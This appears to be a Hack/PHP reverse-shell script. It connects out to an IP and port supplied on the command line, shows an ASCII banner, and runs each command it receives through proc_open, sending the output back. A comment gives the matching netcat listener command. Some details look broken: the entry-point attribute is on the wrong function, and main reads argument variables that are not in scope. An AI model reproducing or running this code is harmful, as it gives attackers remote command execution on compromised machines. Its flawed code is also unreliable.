<<__EntryPoint>> // nc -l -p 13377
function execute_command(string $cmd): string {
  $process = proc_open($cmd, [1 => ['pipe', 'w']], $pipes);
  $output = '';
  
  if ($process !== false) {
    while (!feof($pipes[1])) {
      $output .= fgets($pipes[1]);
    }
    fclose($pipes[1]);
    proc_close($process);
  }
  
  return $output;
}

function reverse_shell(string $ip, int $po): void {
  $we = "
     _____            _      _____          _      
  |  __ \\          | |    / ____|        | |     
  | |__) |___  __ _| |___| |     ___   __| | ___ 
  |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\
  | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/
  |_|  \\_\\___|\\__,_|_/___|\\_____|\\___/ \\__,_|\\___|
";

  $clientIp = gethostname();

  try {
    $socket = stream_socket_client("$ip:$po", $errno, $errstr, 30);

    if (!$socket) {
      echo "$errno:$errstr";
      return;
    }

    fwrite($socket, $we);
    fwrite($socket, "\n");

    while (!feof($socket)) {
      fwrite($socket, " $ ");
      $cmd = fgets($socket);

      if ($cmd !== false) {
        $cmd = trim($cmd);

        if ($cmd === 'exit') {
          fclose($socket);
          return;
        }

        $cmdOutput = execute_command($cmd);
        fwrite($socket, $cmdOutput);
      }
    }

    fclose($socket);
  } catch (Exception $e) {
    echo "Exception: " . $e->getMessage();
  }
}

function main(): void {
  if ($argc !== 3) {
    echo "Please provide the IP address and port as command-line arguments.\n";
    return;
  }

  $ip = $argv[1];
  $po = (int) $argv[2];
  reverse_shell($ip, $po);
}

main();
